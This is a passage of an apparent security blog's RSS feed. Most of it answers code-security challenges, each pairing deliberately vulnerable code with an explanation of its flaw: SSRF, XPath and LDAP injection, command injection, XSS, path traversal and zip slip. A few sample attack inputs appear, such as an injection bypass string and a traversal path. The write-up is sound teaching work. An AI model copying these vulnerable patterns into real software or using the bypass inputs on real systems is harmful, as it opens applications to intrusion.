  &lt;li&gt;&lt;a href=&quot;https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf&quot;&gt;https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It‚Äôs-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://blog.certimetergroup.com/it/articolo/security/polyglot_phar_deserialization_to_rce&quot;&gt;https://blog.certimetergroup.com/it/articolo/security/polyglot_phar_deserialization_to_rce&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Fri, 08 Jan 2021 09:00:00 +0000</pubDate>
        <link>http://snoopysecurity.github.io/web-application-security/2021/01/08/02_php_object_injection_exploitation-notes.html</link>
        <guid isPermaLink="true">http://snoopysecurity.github.io/web-application-security/2021/01/08/02_php_object_injection_exploitation-notes.html</guid>
        
        
        <category>web-application-security</category>
        
      </item>
    
      <item>
        <title>Code Security Advent Calendar 2020 Answers</title>
        <description>&lt;p&gt;SonarSource is a company focused on code quality and static analysis.  This year, SonarSource, along with RIPS Technologies will be tweeting code challenges from real world vulnerabilities on their twitter &lt;a href=&quot;https://twitter.com/SonarSource&quot;&gt;@SonarSource&lt;/a&gt;.More information regarding this can be seen here: &lt;a href=&quot;https://blog.sonarsource.com/code-security-advent-calendar-2020/&quot;&gt;https://blog.sonarsource.com/code-security-advent-calendar-2020/&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;This blog post will go through some of the solutions. Note: this might be wrong from the intended solution given by SonarSource&lt;/p&gt;

&lt;h3 id=&quot;challenge-1httpstwittercomsonarsourcestatus1333803048599121921&quot;&gt;&lt;a href=&quot;https://twitter.com/SonarSource/status/1333803048599121921&quot;&gt;Challenge 1&lt;/a&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from django.contrib import auth, messages
from django.http import HttpResponseRedirect
from django.shortcuts import redirect, render
from django.utils.translation import ugettext as _
from django.views.generic import CreateView, FormView, RedirectView


class RegisterView(CreateView):
    model = User
    form_class = RegistrationForm
    template_name = &quot;register.html&quot;
    success_url = &quot;/&quot;
    def post(self, request, *args, **kwargs):
        form = self.form_class(data=request.POST)
        if form.is_valid():
            user = form.save(commit=False)
            password = form.cleaned_data.get(&quot;password1&quot;)
            user.set_password(password)
            user.save()
        return redirect(&quot;login&quot;)
        
        
    def dispatch(self, request, *args, **kwargs):
        if self.request.user.is_authenticated:
            return HttpResponseRedirect(self.get_success_url())
        return super().dispatch(self.request, *args, **kwargs)
    def get_success_url(self):
        if &quot;next&quot; in self.request.GET and self.request.GET[&quot;next&quot;] != &quot;&quot;:
            return self.request.GET[&quot;next&quot;]
        else:
            return self.success_url
            
            
    def get_form_class(self):
        return self.form_class


&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The issue here arises from the &lt;code class=&quot;highlighter-rouge&quot;&gt;get_success_url&lt;/code&gt; function and an &lt;strong&gt;Open Redirect&lt;/strong&gt; vulnerability.. This function checks for a parameter called &lt;code class=&quot;highlighter-rouge&quot;&gt;next&lt;/code&gt; and makes a redirect to this parameter value. As such it is possible to &lt;code class=&quot;highlighter-rouge&quot;&gt;djangoapplication?next=//attackersite.url&lt;/code&gt;. This redirect will happen after &lt;code class=&quot;highlighter-rouge&quot;&gt;self.request.user.is_authenticated&lt;/code&gt; is successful.&lt;/p&gt;

&lt;h3 id=&quot;challenge-2httpstwittercomsonarsourcestatus1334165427719725058&quot;&gt;&lt;a href=&quot;https://twitter.com/SonarSource/status/1334165427719725058&quot;&gt;Challenge 2&lt;/a&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;package com.example.restservice;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.atomic.AtomicLong;
import java.util.logging.Logger;
import org.springframework.web.bind.annotation.*;
import org.apache.commons.io.IOUtils;
import org.apache.http.entity.StringEntity;
import org.apache.http.entity.ContentType;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.util.EntityUtils;
@RestController
public class RequestController {
    private static final Logger logger = null;
    private final AtomicLong counter = new AtomicLong();
    @RequestMapping(value = {&quot;/api/adapter/{adapter}/activate/{b}&quot;}, 
            method = RequestMethod.POST, produces = &quot;application/json&quot;)
    public String activateAdapter(
            @PathVariable(&quot;adapter&quot;) String connName, 
            @PathVariable(&quot;b&quot;) Integer b) throws IOException {
        logger.info(&quot;activating adapter.&quot;);
        HttpPost post = new HttpPost(&quot;https://&quot; + connName + &quot;/v1/boot&quot;);
        String requestBody = &quot;{\&quot;activate\&quot;:&quot; + Integer.toString(b) + &quot;}&quot;;
        StringEntity requestEntity = new StringEntity(
            requestBody, 
            ContentType.APPLICATION_JSON
        );
        post.setEntity(requestEntity);
        try (CloseableHttpClient httpClient = HttpClients.createDefault();
             CloseableHttpResponse response = httpClient.execute(post)) {
            logger.info(&quot;response:&quot; + response.getEntity());
            return EntityUtils.toString(response.getEntity());
        }
    }
}

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The issue here arises from the &lt;code class=&quot;highlighter-rouge&quot;&gt;adapter&lt;/code&gt; parameter coming from user input. This is given as part of the &lt;code class=&quot;highlighter-rouge&quot;&gt;HttpPost&lt;/code&gt; constructor and a new object called &lt;code class=&quot;highlighter-rouge&quot;&gt;post&lt;/code&gt;is made which has &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;https://&quot; + connName + &quot;/v1/boot&quot;&lt;/code&gt;. This is then given to the &lt;code class=&quot;highlighter-rouge&quot;&gt;httpClient.execute&lt;/code&gt; method which will make a request to the crafted url and return the response. This can be abused for an &lt;strong&gt;Server Side Request Forgery (SSRF)&lt;/strong&gt; attack.&lt;/p&gt;

&lt;h3 id=&quot;challenge-3httpstwittercomsonarsourcestatus1334527819402145792&quot;&gt;&lt;a href=&quot;https://twitter.com/SonarSource/status/1334527819402145792&quot;&gt;Challenge 3&lt;/a&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php 
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Request;
class LoginController extends AbstractController {
    private DOMDocument $doc;
    private $authFile = 'employees.xml';
    
    private function auth($userId, $passwd) {
        $this-&amp;gt;doc-&amp;gt;load($this-&amp;gt;authFile);
        $xpath = new DOMXPath($this-&amp;gt;doc);
        $filter = &quot;[loginID=$userId and passwd='$passwd'][position()&amp;lt;=1]&quot;;
        $employee = $xpath-&amp;gt;query(&quot;/employees/employee$filter&quot;);
        return ($employee-&amp;gt;length == 0) ? false : true;
    }    
    public function index(Request $request) {
        $userId = (int)$request-&amp;gt;request-&amp;gt;get('userId');
        $password = $request-&amp;gt;request-&amp;gt;get('password');
        if ($request-&amp;gt;request-&amp;gt;get('submit') !== null) {
            try {
                if (!$this-&amp;gt;auth($userId, $password)) {
                    return $this-&amp;gt;json(['error' =&amp;gt; &quot;Wrong $userId.&quot;]);
                }
                else {
                    $this-&amp;gt;loginCompleted(true);
                    $this-&amp;gt;loadUserInformation($employee);
                }
            } catch (Exception $e) {
                return $this-&amp;gt;json(['error' =&amp;gt; &quot;Login Failed.&quot;]);
            }
        }
        return $this-&amp;gt;json(['error' =&amp;gt; &quot;Login Succeeded.&quot;]);
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The vulnerability here is an &lt;strong&gt;XPath Injection&lt;/strong&gt;. Within function &lt;code class=&quot;highlighter-rouge&quot;&gt;auth&lt;/code&gt;, the &lt;code class=&quot;highlighter-rouge&quot;&gt;$userId&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;$passwd&lt;/code&gt; parameter is used to create an XPath query without any sanitization/validation: &lt;code class=&quot;highlighter-rouge&quot;&gt;loginID=$userId and passwd='$passwd'&lt;/code&gt;This query is used to check if the provided &lt;code class=&quot;highlighter-rouge&quot;&gt;userid&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;password&lt;/code&gt; exists within &lt;code class=&quot;highlighter-rouge&quot;&gt;employees.xml&lt;/code&gt;. This check is within the line &lt;code class=&quot;highlighter-rouge&quot;&gt;return ($employee-&amp;gt;length == 0) ? false : true;.&lt;/code&gt; This could be abused by a user and bypass this check by injecting something like &lt;code class=&quot;highlighter-rouge&quot;&gt;' OR '6'='6&lt;/code&gt; .&lt;/p&gt;

&lt;h3 id=&quot;challenge-4httpstwittercomsonarsourcestatus1334890204843347969&quot;&gt;&lt;a href=&quot;https://twitter.com/SonarSource/status/1334890204843347969&quot;&gt;Challenge 4&lt;/a&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;using System.IO;
using System.Net;
using System.Net.Http;
using Microsoft.AspNetCore.Mvc;
namespace core_api.Controllers
{
    public class DataDownloadController : Controller {
        public readonly string AvatarFolder = &quot;images/avatars/&quot;;
        [HttpGet]
        public HttpResponseMessage GetAvatar(string image) {
            if (string.IsNullOrWhiteSpace(image) || image.Contains(&quot;/&quot;)) {
                return new HttpResponseMessage(HttpStatusCode.BadRequest) {
                    Content =  new StringContent(&quot;Valid avatar required&quot;)};    
            }
            string img = System.IO.Path.Combine(AvatarFolder, image);
            if (!img.Contains(AvatarFolder) || !System.IO.File.Exists(img)) { 
                return new HttpResponseMessage(HttpStatusCode.NotFound) {
                    Content =  new StringContent(&quot;Avatar not found&quot;)};
            }
            var fileInfo = new System.IO.FileInfo(img);
            var type = fileInfo.Extension;
            var c = new StreamContent(fileInfo.OpenRead());
            c.Headers.ContentType = new System.Net.Http.Headers.
                MediaTypeHeaderValue(&quot;image/&quot; + type);
            return new HttpResponseMessage(HttpStatusCode.OK){Content = c};
        }
    }
}

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;In the above C# code, the source where tainted data is coming from the &lt;code class=&quot;highlighter-rouge&quot;&gt;HttpGet&lt;/code&gt; method. This is then given to the &lt;code class=&quot;highlighter-rouge&quot;&gt;GetAvatar&lt;/code&gt; as an argument. This function checks if the user value contains a &lt;code class=&quot;highlighter-rouge&quot;&gt;/&lt;/code&gt; character and if it does, an error is returned to the user. If this check is not triggered, then the user provided value is combined with &lt;code class=&quot;highlighter-rouge&quot;&gt;images/avatar&lt;/code&gt; path using the &lt;code class=&quot;highlighter-rouge&quot;&gt;System.IO.Path.Combine&lt;/code&gt; method. A new constructor is created with the &lt;code class=&quot;highlighter-rouge&quot;&gt;System.IO.FileInfo&lt;/code&gt; class which provides methods for creation, copying, deletion, moving, and opening of files. The &lt;code class=&quot;highlighter-rouge&quot;&gt;File.OpenRead&lt;/code&gt; method is used to fetch the file in this path. On windows systems, the &lt;code class=&quot;highlighter-rouge&quot;&gt;..\&lt;/code&gt; pattern or &lt;code class=&quot;highlighter-rouge&quot;&gt;../&lt;/code&gt; pattern can be used to traverse directories. As such, the above code is vulnerable to &lt;strong&gt;Path Traversal&lt;/strong&gt;.&lt;/p&gt;

&lt;h3 id=&quot;challenge-5httpstwittercomsonarsourcestatus1335252597993689088&quot;&gt;&lt;a href=&quot;https://twitter.com/SonarSource/status/1335252597993689088&quot;&gt;Challenge 5&lt;/a&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from django.contrib import messages
from django.shortcuts import render, redirect
from django.contrib.sites.shortcuts import get_current_site
from django.template.loader import render_to_string
from django.utils.http import urlsafe_base64_encode, urlsafe_base64_decode
from django.utils.encoding import force_bytes, force_text
from django.views.decorators.http import require_http_methods
from hashlib import sha1
from project.decorators import check_recaptcha
from project.forms import UserSignUpForm
from project.settings import config
from sendgrid import SendGridAPIClient
from sendgrid.helpers.mail import Mail
from django.contrib.auth import get_user_model
User = get_user_model()
@check_recaptcha
@require_http_methods([&quot;POST&quot;])
def register(request):
    form = UserSignUpForm(request.POST)
    if form.is_valid() and request.recaptcha_is_valid:
        user = form.save(commit=False)
        user.is_active = False
        user.save()
        message = render_to_string('mail/activate.html', {
            'user': user,
            'uid': urlsafe_base64_encode(force_bytes(user.pk)),
            'token': sha1(force_bytes(user.pk)).hexdigest(),
        })
        message = Mail(
            from_email='noreply@' + get_current_site(request).domain,
            to_emails=request.POST.get('email'),
            subject='Your account activation email',
            html_content=message)
        response = SendGridAPIClient(config['SG_API_KEY']).send(message)
        messages.add_message(request, messages.SUCCESS, 'Verification email sent.')
    else:
        return render(request, 'account/register.html', {'form': form})
    return render(request, 'account/register.html', {'form': UserSignUpForm()})
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;In the above code, the &lt;code class=&quot;highlighter-rouge&quot;&gt;SHA1&lt;/code&gt; hashing algorithm is used without a salt to generate a token.: &lt;code class=&quot;highlighter-rouge&quot;&gt;sha1(force_bytes(user.pk)).hexdigest()&lt;/code&gt;. As such, an attacker could generate a list of SHA1 hashes and try and brute force the password reset email token of a user. The vulnerability here is &lt;strong&gt;Insecure Token Generation&lt;/strong&gt;.&lt;/p&gt;

&lt;h3 id=&quot;challenge-6httpstwittercomsonarsourcestatus1335614981224738816&quot;&gt;&lt;a href=&quot;https://twitter.com/SonarSource/status/1335614981224738816&quot;&gt;Challenge 6&lt;/a&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;package org.example;
import javax.servlet.ServletException;
import javax.servlet.http.*;
import java.io.*;
public class IndexServlet extends HttpServlet {
    private String referer;
    private ExportIcalManager exportManager;
    private void exportIcal(HttpServletResponse res, String sessionId) 
            throws ServletException, IOException {
        res.addHeader(&quot;Access-Control-Allow-Origin&quot;, referer);
        res.setContentType(&quot;text/plain&quot;);
        ExportIcalManager exportManager = new ExportIcalManager(sessionId);
        String filePath = exportManager.exportIcalAgendaForSynchro();
        OutputStream os = res.getOutputStream();
        FileInputStream fs = new FileInputStream(filePath);
        int i;
        while (((i = fs.read()) != -1)) { os.write(i); }
        os.close();
    }
    protected void doPost(HttpServletRequest req, HttpServletResponse res) 
            throws ServletException, IOException {
        HttpSession session = req.getSession();
        referer = req.getParameter(&quot;referer&quot;);
        exportIcal(res, req.getRequestedSessionId());
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This vulnerability the above code is exposed to is &lt;strong&gt;Misconfigured Cross Origin Resource Sharing (Cors)&lt;/strong&gt;. The referer header from a user‚Äôs request is used to set the &lt;code class=&quot;highlighter-rouge&quot;&gt;Access-Control-Allow-Origin&lt;/code&gt; header. An attacker could spoof this header to provide a wildcard &lt;code class=&quot;highlighter-rouge&quot;&gt;*&lt;/code&gt;, or modify this through a redirect from an attacker site to allow cross origin communication.&lt;/p&gt;

&lt;h3 id=&quot;challenge-7httpstwittercomsonarsourcestatus1335614981224738816&quot;&gt;&lt;a href=&quot;https://twitter.com/SonarSource/status/1335614981224738816&quot;&gt;Challenge 7&lt;/a&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
class Upload
{
    private $detect_mime = TRUE;
    private $type_regex = '/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/';
    public function do_upload($field = 'userfile') {
        $file = $_FILES[$field];
        $this-&amp;gt;file_size = $file['size'];
        $this-&amp;gt;_file_mime_type($file);
    }
    private function _file_mime_type($file) {
        if (function_exists('finfo_file')) {
            $finfo = @finfo_open(FILEINFO_MIME);
            $mime = @finfo_file($finfo, $file['tmp_name']);
            if (preg_match($this-&amp;gt;type_regex, $mime, $match)) {
                return $this-&amp;gt;file_type = $match[1];
            }
        }
        $cmd = 'file --brief --mime '.$file['name'].' 2&amp;gt;&amp;amp;1';
        exec($cmd, $mime, $status);
        if ($status === 0 &amp;amp;&amp;amp; preg_match($this-&amp;gt;type_regex, $mime, $match)) {
            return $this-&amp;gt;file_type = $match[1];
        }
    }
}
$upload = new Upload();
$upload-&amp;gt;do_upload();
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;do_upload&lt;/code&gt; function takes a user provided file (i assume) and the &lt;code class=&quot;highlighter-rouge&quot;&gt;file_mime_type&lt;/code&gt; function is called to open this file. The name of this file is taken by the &lt;code class=&quot;highlighter-rouge&quot;&gt;$file['name']&lt;/code&gt; object and is provided as part to the &lt;code class=&quot;highlighter-rouge&quot;&gt;exec&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;$cmd = 'file --brief --mime '.$file['name'].' 2&amp;gt;&amp;amp;1';&lt;/code&gt;) function. The vulnerability here is a &lt;strong&gt;Command Injection&lt;/strong&gt;.&lt;/p&gt;

&lt;h3 id=&quot;challenge-8httpstwittercomsonarsourcestatus1336352473871769603&quot;&gt;&lt;a href=&quot;https://twitter.com/SonarSource/status/1336352473871769603&quot;&gt;Challenge 8&lt;/a&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;using Microsoft.AspNetCore.Html;
using Microsoft.AspNetCore.Mvc;
using System.Text.Encodings.Web;
using System;
using System.Threading;
using System.Threading.Tasks;
namespace Core31Demo.Controllers
{
    public class HomeController : Controller {        
        [HttpGet]
        public async Task&amp;lt;IActionResult&amp;gt; Logout(string logoutId) {
            ViewBag.Logout = &quot;Please confirm logout &amp;amp;#8230;&quot;;
            if (User.Identity.IsAuthenticated == false) {
                return await Logout(new LogoutViewModel { LogoutId = logoutId });
            }
            return View(&quot;ConfirmLogout&quot;);
        }
        [HttpPost][ValidateAntiForgeryToken]
        public async Task&amp;lt;IActionResult&amp;gt; Logout(LogoutViewModel model) {
            await PerformSignOutAsync(model);
            ViewData[&quot;Logout&quot;] = model.LogoutId;
            return View(&quot;Logout&quot;);
        }
        
        static async Task PerformSignOutAsync(LogoutViewModel model) {
            // sign out logic
            // throw new NotImplementedException();
        }
    }
    
    public class LogoutViewModel {
         public string LogoutId; 
    }
}


// Views/Home/Logout.cshtml

&amp;lt;div class=&quot;page-header&quot;&amp;gt;
    &amp;lt;h1&amp;gt;@Html.Raw(@ViewBag.Logout)&amp;lt;/h1&amp;gt;&amp;lt;/div&amp;gt;
&amp;lt;div class=&quot;logout-back&quot;&amp;gt;&amp;lt;a asp-controller=&quot;Home&quot; 
     asp-action=&quot;Login&quot; asp-route-id=&quot;@ViewData[&quot;Logout&quot;]&quot;&amp;gt;back&amp;lt;/a&amp;gt;
&amp;lt;/div&amp;gt;


&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;A &lt;strong&gt;Cross-site Scripting (XSS)&lt;/strong&gt; issue exists in the above code. User input is taken as the &lt;code class=&quot;highlighter-rouge&quot;&gt;logoutId&lt;/code&gt; parameter ( through &lt;code class=&quot;highlighter-rouge&quot;&gt;HttpGet&lt;/code&gt;). A new &lt;code class=&quot;highlighter-rouge&quot;&gt;LogoutViewModel&lt;/code&gt; instance is created with the &lt;code class=&quot;highlighter-rouge&quot;&gt;logoutId&lt;/code&gt; parameter: &lt;code class=&quot;highlighter-rouge&quot;&gt;Logout(new LogoutViewModel { LogoutId = logoutId });&lt;/code&gt;. This is then given to the &lt;code class=&quot;highlighter-rouge&quot;&gt;Task&lt;/code&gt; method which bind its to the &lt;code class=&quot;highlighter-rouge&quot;&gt;@ViewBag.Logout&lt;/code&gt; model attribtue. The method &lt;code class=&quot;highlighter-rouge&quot;&gt;Html.Raw()&lt;/code&gt; returns an IHtmlString with any HTML encoding. As such, XSS is possible.&lt;/p&gt;

&lt;h3 id=&quot;challenge-9httpstwittercomsonarsourcestatus1336702146276888577&quot;&gt;&lt;a href=&quot;https://twitter.com/SonarSource/status/1336702146276888577&quot;&gt;Challenge 9&lt;/a&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from __future__ import unicode_literals
import os
import shutil
import tempfile
import traceback
import zipfile
from django import forms
from django.http.response import HttpResponseRedirect
from django.utils.translation import ugettext_lazy as _
from django.views.generic import FormView
from django.views.decorators.csrf import csrf_exempt
class AddonUploadView(FormView):
    form_class = forms.Form
    template_name = &quot;package/addon/upload.jinja&quot;
    def get_addon_path(self):
        filename = os.path.basename(self.request.GET.get(&quot;my_file&quot;))
        tmp_token = self.request.GET.get('my_token')
        path = os.path.join(tempfile.gettempdir(), tmp_token, filename)
        if not os.path.isfile(path):
            raise ValueError(&quot;Error! File not found.&quot;)
        if hasattr(os, &quot;geteuid&quot;) and os.stat(path).st_uid != os.geteuid():
            raise ValueError(&quot;Error! File not owned by current user.&quot;)
        return path
    @csrf_exempt
    def form_valid(self, form):
        try:
            installer.install_package(self.get_addon_path())
            response[&quot;success&quot;] = True
        except Exception:
            os.unlink(self.get_addon_path())
            response[&quot;success&quot;] = False
        return self.render_to_response(response)

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Three issues are described in the above code:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Cross Site Request Forgery&lt;/strong&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;@csrf_exempt&lt;/code&gt; in Django removes Cross Site Request Forgery protection allowing the request to be forged by an attacker.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Path Traversal&lt;/strong&gt; - The &lt;code class=&quot;highlighter-rouge&quot;&gt;path&lt;/code&gt; generated by the &lt;code class=&quot;highlighter-rouge&quot;&gt;AddonUploadView&lt;/code&gt; function is user tainted.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;        filename = os.path.basename(self.request.GET.get(&quot;my_file&quot;))
        tmp_token = self.request.GET.get('my_token')
        path = os.path.join(tempfile.gettempdir(), tmp_token, filename)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;This is then given to the &lt;code class=&quot;highlighter-rouge&quot;&gt;os.stat(path)&lt;/code&gt; function which will execute the file provided by the user tainted path allowing execution of a user controlled file. This same also exists in &lt;code class=&quot;highlighter-rouge&quot;&gt;os.unlink(self.get_addon_path())&lt;/code&gt; where a path traversal can lead to arbritary file delete.&lt;/p&gt;

&lt;h3 id=&quot;challenge-10httpstwittercomsonarsourcestatus1337064532355633152&quot;&gt;&lt;a href=&quot;https://twitter.com/SonarSource/status/1337064532355633152&quot;&gt;Challenge 10&lt;/a&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import java.io.*;
import java.util.Enumeration;
import java.util.HashSet;
import java.util.Set;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import org.apache.commons.io.FileUtils;
import org.apache.commons.io.IOUtils;
@WebServlet(value=&quot;/unzip&quot;, name=&quot;ZipUtils&quot;)
class ZipUtils extends GenericServlet {
    private static final String BASE_DIR = &quot;projects&quot;;
    @Override
    public void service(ServletRequest req, ServletResponse res) throws IOException {
        File zipFile = new File(BASE_DIR, req.getParameter(&quot;file&quot;));
        if (zipFile.getCanonicalPath().startsWith(BASE_DIR)) {
            File indir = new File(&quot;/tmp/local/my_jars&quot;);
            unjar(zipFile, indir);
        }
    }
    private File[] unjar(File uploadFile, File inDir) throws IOException {
        String uploadFileName = inDir + File.separator + uploadFile.getName();
        ZipFile uploadZipFile = new ZipFile(uploadFile);
        Set&amp;lt;File&amp;gt; files = new HashSet&amp;lt;File&amp;gt;();
        Enumeration entries = uploadZipFile.entries();
        // unpack uploaded zip file
        while (entries.hasMoreElements()) {
            ZipEntry entry = (ZipEntry) entries.nextElement();
            File fe = new File(uploadFileName, entry.getName());
            if (entry.isDirectory()) {
                fe.mkdirs();
            } else {
                if (fe.getParentFile() != null 
                &amp;amp;&amp;amp; !fe.getParentFile().exists()) {
                    fe.getParentFile().mkdirs();
                }
                files.add(fe);
                IOUtils.copy(uploadZipFile.getInputStream(entry), 
                    new BufferedOutputStream(new FileOutputStream(fe)));
            }
        }
        uploadZipFile.close();
        return files.toArray(new File[files.size()]);
    }
}

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The above code is vulnerable to &lt;strong&gt;Zip Path Traversal&lt;/strong&gt;.  User input (source) is entering via &lt;code class=&quot;highlighter-rouge&quot;&gt;uploadZipFile.entries()&lt;/code&gt; method (&lt;code class=&quot;highlighter-rouge&quot;&gt;Map.Entry&lt;/code&gt;). The code iterates through this &lt;code class=&quot;highlighter-rouge&quot;&gt;Map&lt;/code&gt; and the &lt;code class=&quot;highlighter-rouge&quot;&gt;getInputStream&lt;/code&gt; method is used to fetch the file and &lt;code class=&quot;highlighter-rouge&quot;&gt;IOUtils.copy&lt;/code&gt; is used to copy bytes from an &lt;code class=&quot;highlighter-rouge&quot;&gt;InputStream &lt;/code&gt;to chars on a Writer.&lt;/p&gt;

&lt;p&gt;As such, you can create a ZIP archive containing an archive path such as &lt;code class=&quot;highlighter-rouge&quot;&gt;..\..\..\newfile&lt;/code&gt; and this file will be written outside the destination directory. This could be abused to overwrite files within the system.&lt;/p&gt;

&lt;h3 id=&quot;challenge-11httpstwittercomsonarsourcestatus1337411824627552257&quot;&gt;&lt;a href=&quot;https://twitter.com/SonarSource/status/1337411824627552257&quot;&gt;Challenge 11&lt;/a&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
use Illuminate\Routing\Controller;
use Illuminate\Http\Response;
use Illuminate\Support\Facades\Request;
class Authenticate{
    private function getEmail($email_field, $user_data) {
        foreach($email_field as $field) {
            if (isset($user_data[0][$field][0])) {
                return $user_data[0][$field][0];
            }
        }
        return NULL;
    }
    public function findUsername() {
        $envvar = $this-&amp;gt;settings['fields']['envvar'];
        $ldapdn = Config::read('WebApp.ldapDN');
        $ldapSearchFilter = Config::read('WebApp.ldapSearchFilter');
        $ldapEmailField = Config::read('WebApp.ldapEmailField');
        $ldapconn = ldap_connect(Config::read('WebApp.ldapServer')) 
            or die('LDAP server connection failed');
        if (!($ldapbind = ldap_bind($ldapconn))) {
            die(&quot;LDAP bind failed&quot;);
        }
        if (!empty($ldapSearchFilter)) {
            $filter = '(&amp;amp;' . $ldapSearchFilter . '(' .
            Config::read('WebApp.ldapSearchAttribut') . '=' .
            Request::input($envvar) . '))';
        }
        $getLdapUserInfo = Config::read('WebApp.ldapFilter');
        $result = ldap_search($ldapconn, $ldapdn, $filter, $getLdapUserInfo)
            or die(&quot;LDAP Error: &quot; . ldap_error($ldapconn));
        $ldapUserData = ldap_get_entries($ldapconn, $result);
        if (!isset($ldapEmailField) &amp;amp;&amp;amp; isset($ldapUserData[0]['mail'][0])) {
            $username = $ldapUserData[0]['mail'][0];
        } else if (isset($ldapEmailField)) {
            $username = $this-&amp;gt;getEmail($ldapEmailField, $ldapUserData);
        } else {
            die(&quot;User not found in LDAP&quot;);
        }
        ldap_close($ldapconn);
        return $username;
    }
}

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;User concentated data is inserted to the  &lt;code class=&quot;highlighter-rouge&quot;&gt;ldap_search&lt;/code&gt; function resulting in &lt;strong&gt;LDAP Injection&lt;/strong&gt;: &lt;code class=&quot;highlighter-rouge&quot;&gt;ldap_search($ldapconn, $ldapdn, $filter, $getLdapUserInfo)&lt;/code&gt; An ldap query is created with &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapSearchFilter&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;$envvar&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;$envvar&lt;/code&gt; can be user controlled data, and as such LDAP Injection is possible.&lt;/p&gt;

&lt;h3 id=&quot;challenge-12httpstwittercomsonarsourcestatus1337789307386359812&quot;&gt;&lt;a href=&quot;https://twitter.com/SonarSource/status/1337789307386359812&quot;&gt;Challenge 12&lt;/a&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;using System;
using System.Collections;
using System.Globalization;
using System.Text.RegularExpressions;
using Microsoft.AspNetCore.Mvc;
using System.Linq;
namespace core_api.Controllers
{
    public class BlogPost {
        public DateTime ReleaseDate { get; set; }
        public string Content { get; set; }
    }
    public class BlogController : Controller
    {
        ArrayList Posts = new ArrayList();
        string Keyword = &quot;[highlight]&quot;;
        
        public void init() {
            Posts.Add(new BlogPost{ReleaseDate = new DateTime(2009, 8, 1, 0, 0, 0), Content=&quot;[highlight]&quot;});
        }
       
        [Route(&quot;api/search&quot;)]
        [HttpGet]
        public ArrayList search(string search, string since) {
